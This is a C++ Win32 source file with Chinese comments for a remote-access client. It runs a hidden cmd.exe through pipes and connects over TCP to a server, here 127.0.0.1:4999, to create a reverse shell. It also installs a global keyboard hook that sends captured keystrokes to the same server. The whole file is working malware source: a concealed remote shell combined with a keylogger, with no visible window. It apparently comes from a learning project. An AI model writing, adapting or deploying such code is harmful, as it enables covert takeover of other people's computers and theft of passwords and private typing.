// ReClient_KBH_CMD.cpp : 定义应用程序的入口点。
//
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <WinSock2.h>
#include "framework.h"
#include "ReClient_KBH_CMD.h"
#include "kbh.h"
#include "MyPacket.h"
#include <stdio.h>
#include <thread>

//#include <afx.h>
//
//#define _AFXDLL

#pragma comment(lib,"KBHook_DLL.lib")
#pragma comment(lib,"ws2_32.lib")

#define MAX_LOADSTRING 100

int nRet;

WSADATA			wasData;//初始化windows套接字
char szCmdLine[256] = { 0 };
SOCKET s;
int Port = 4999;
HANDLE	m_hOutWrite, hOutRead;
HANDLE	m_hInRead, hInWrite;


char szBuf[4096] = { 0 };


int InitSocket() {

	//初始化套接字

	nRet = WSAStartup(MAKEWORD(2, 2), &wasData);
	if (nRet != 0)
	{
		printf("WSAStartup failed with erro %d\n", nRet);
		return 0;
	}

	//1. socket 创建套接字 (可以理解成管道的Pipe句柄，用于后续数据传输接口)
	s = WSASocket(
		AF_INET,//INET协议簇
		SOCK_STREAM,//表示使用TCP协议
		0,
		NULL,
		0,
		0);
	if (s == INVALID_SOCKET)
	{
		printf("socket failed with erro %d\n", WSAGetLastError());
		WSACleanup();
		return 0;

	}


	//3. connect  cmd主动连接服务端


	sockaddr_in addr;//服务端套接字

	addr.sin_family = AF_INET;//协议
	addr.sin_port = htons(Port);
	addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");;//服务端ip地址
	printf("We are trying to connect to %s:%d\n", inet_ntoa(addr.sin_addr), addr.sin_port);

	nRet = connect(s, (SOCKADDR*)&addr, sizeof(addr));
	if (nRet == SOCKET_ERROR)
	{
		printf("connect failed with erro %d\n", WSAGetLastError());
		closesocket(s);
		WSACleanup();
		return 0;

	}

	printf("Our connection successed.\n");

	return 1;
}




int InitCmd()
{
	//初始化CMD,创建了管道以及cmd进程

	//1.创建管道 （两个匿名管道）
	SECURITY_ATTRIBUTES	sa = { 0 };
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;

	nRet = CreatePipe(
		&hOutRead,
		&m_hOutWrite,
		&sa,
		0
	);
	if (!nRet)
	{
		//MessageBox(_T("CreatePipe error"));
		printf("CreatePipe error");
		return 0;
	}
	//输入管道
	//HANDLE	m_hInRead, hInWrite;
	nRet = CreatePipe(
		&m_hInRead,
		&hInWrite,
		&sa,
		0
	);
	if (!nRet)
	{
		//MessageBox(_T("CreatePipe error"));
		printf("CreatePipe error");
		return 0;
	}
	//2.创建进程	cmd.exe
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(STARTUPINFOW);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;

	si.hStdInput = hOutRead;
	si.hStdOutput = hInWrite;
	si.hStdError = hInWrite;

	GetEnvironmentVariable(_T("COMSPEC"), (LPWSTR)szCmdLine, sizeof(szCmdLine));
	nRet = CreateProcess(
		NULL,
		(LPWSTR)szCmdLine,
		NULL,
		NULL,
		TRUE,
		0,
		NULL,
		NULL,
		&si,
		&pi

	);
	if (!nRet)
	{
		//MessageBox(_T("CreateProcess error"));
		printf("CreateProcess error");
		return 0;
	}

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return 1;

}

/*
	功能：将szBuf中的字符串数据 发送给服务端


*/

int mySend(SOCKET s,char* szBuf,unsigned int PktType) {


	char szBuf1[4096] = { 0 };
	//char* pStr = szBuf;
	memcpy(szBuf1, szBuf, strlen(szBuf));
	//读取完成后，通过socket 发送给服务端

	MyPacket* pPkt = (MyPacket*)szBuf;
	pPkt->type = PktType;
	pPkt->length = strlen(szBuf1) + 1;// 仅仅表示数据长度
	memcpy(pPkt->data, szBuf1, pPkt->length);//将数据拷贝到包中

	//if (pPkt->length !=2)//单次只发两个字节  一个字符+\0
	//{
	//	return 0;
	//}

	nRet = send(s,
		(const char*)pPkt,
		pPkt->length + sizeof(unsigned int) * 2,
		0);
	if (nRet == SOCKET_ERROR)
	{
		printf("send error");
		return 0;
	}

	return 1;
}


/*
	功能：收取指定字节大小的数据

	参数：

	返回：收取的字节数

*/
int myrecv(SOCKET NewConnection, char* szBuf, int nBytes) {
	memset(szBuf, 0, sizeof(szBuf));
	nRet = recv(NewConnection, szBuf, nBytes, 0);
	if (nRet == SOCKET_ERROR)
	{
		printf("send error");

		return nRet;
	}
	return 0;
}




// 全局变量:
HINSTANCE hInst;                                // 当前实例
WCHAR szTitle[MAX_LOADSTRING];                  // 标题栏文本
WCHAR szWindowClass[MAX_LOADSTRING];            // 主窗口类名

// 此代码模块中包含的函数的前向声明:
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    // TODO: 在此处放置代码。

    // 初始化全局字符串
    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_RECLIENTKBHCMD, szWindowClass, MAX_LOADSTRING);
    MyRegisterClass(hInstance);

    // 执行应用程序初始化:
    if (!InitInstance (hInstance, nCmdShow))
    {
        return FALSE;
    }

    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_RECLIENTKBHCMD));


	nRet = InitCmd();
	if (!nRet)
	{
		printf("InitCmd error");
		return 0;
	}

	nRet = InitSocket();
	if (!nRet)
	{
		printf("InitSocket error");
		return 0;
	}

	SetKbHook();//下键盘钩子

	//开启线程

	std::thread thd([&]() {
		//表示子程序新的起点



		DWORD nRead;
		while (TRUE)
		{
			

			//读取管道中的数据
			memset(szBuf, 0, sizeof(szBuf));
			nRet = ReadFile(
				m_hInRead,
				szBuf,
				4095,
				&nRead,
				NULL
			);
			if (!nRet)
			{
				printf("read pipe error");
				return 0;
			}

			//读取完成后，通过socket 发送给服务端

			
			nRet = mySend(s,szBuf, PACKET_REQ_CMD);
			if (nRet==0)
			{
				printf("mySend error");
				return 0;
			}


		}



		});

	//避免主线程结束，子线程对象被销毁
	thd.detach();


	//开启线程

	std::thread thd1([&]() {
		//CString str;
		//recv 收到服务端命令  发送到写管道中去 WriteFile


			while (TRUE)
			{
				memset(szBuf, 0, sizeof(szBuf));
				//循环收包，确保收到完整的包

				//先收8字节数据包的头部
				myrecv(s, szBuf, 8);
				//再根据头部信息收取后面的字节数
				//char szPack[4096] = { 0 };


				MyPacket* pPkt = (MyPacket*)szBuf;

				//判别类型
				if (pPkt->type == PACKET_RLY_CMD)
				{
					myrecv(s, szBuf, pPkt->length);
					//::MessageBox(0, szBuf, "szBuf", 0);

					//str += szBuf;

					//SetDlgItemText(IDC_EDT_OUT, str);
					DWORD nWrite = 0;
					//返回成功的字节数 
				
					nRet = WriteFile(
						m_hOutWrite,
						szBuf,
						nRet,
						&nWrite,
						NULL
					);
					if (!nRet)
					{
						printf("write pipe error");
						return 0;
					}
				}

			}



	});

	thd1.detach();
	


	//MessageBox(0, "准备执行消息循环", "title", 0);



    MSG msg;

    // 主消息循环:
    while (GetMessage(&msg, nullptr, 0, 0))
    {
  /*      if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {*/
            TranslateMessage(&msg);
            DispatchMessage(&msg);
      /*  }*/
    }

    return (int) msg.wParam;
}



//
//  函数: MyRegisterClass()
//
//  目标: 注册窗口类。
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style          = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc    = WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_RECLIENTKBHCMD));
    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_RECLIENTKBHCMD);
    wcex.lpszClassName  = szWindowClass;
    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}

//
//   函数: InitInstance(HINSTANCE, int)
//
//   目标: 保存实例句柄并创建主窗口
//
//   注释:
//
//        在此函数中，我们在全局变量中保存实例句柄并
//        创建和显示主程序窗口。
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   hInst = hInstance; // 将实例句柄存储在全局变量中

   HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, HWND_MESSAGE, nullptr, hInstance, nullptr);

   if (!hWnd)
   {
      return FALSE;
   }

   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   return TRUE;
}

//
//  函数: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  目标: 处理主窗口的消息。
//
//  WM_COMMAND  - 处理应用程序菜单
//  WM_PAINT    - 绘制主窗口
//  WM_DESTROY  - 发送退出消息并返回
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
	case WM_COPYDATA:
	{
		//接收从dll传来的数据
		PCOPYDATASTRUCT pcds = (PCOPYDATASTRUCT)lParam;

		memset(szBuf, 0, 4096);
		//*szbuf = *(char*)pcds->lpData;



		char* pStr = (char*)pcds->lpData;

		//读取完成后，通过socket 发送给服务端

		MyPacket* pPkt = (MyPacket*)szBuf;
		pPkt->type = PACKET_REQ_KEYBOARD;
		pPkt->length = strlen(pStr) + 1;// 仅仅表示数据长度
		memcpy(pPkt->data, pStr, pPkt->length);//将数据拷贝到包中

		//if (pPkt->length !=2)//单次只发两个字节  一个字符+\0
		//{
		//	return 0;
		//}

		nRet = send(s,
			(const char*)pPkt,
			pPkt->length + sizeof(unsigned int) * 2,
			0);
		if (nRet == SOCKET_ERROR)
		{
			printf("send error");
			return 0;
		}


		//MessageBoxA(0, szbuf, "ch", 0);

	}
	break;

    case WM_COMMAND:
        {
            int wmId = LOWORD(wParam);
            // 分析菜单选择:
            switch (wmId)
            {
            case IDM_ABOUT:
                DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
                break;
            case IDM_EXIT:
                DestroyWindow(hWnd);
                break;
            default:
                return DefWindowProc(hWnd, message, wParam, lParam);
            }
        }
        break;
    case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);
            // TODO: 在此处添加使用 hdc 的任何绘图代码...
            EndPaint(hWnd, &ps);
        }
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

// “关于”框的消息处理程序。
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    switch (message)
    {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;

    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
        {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}
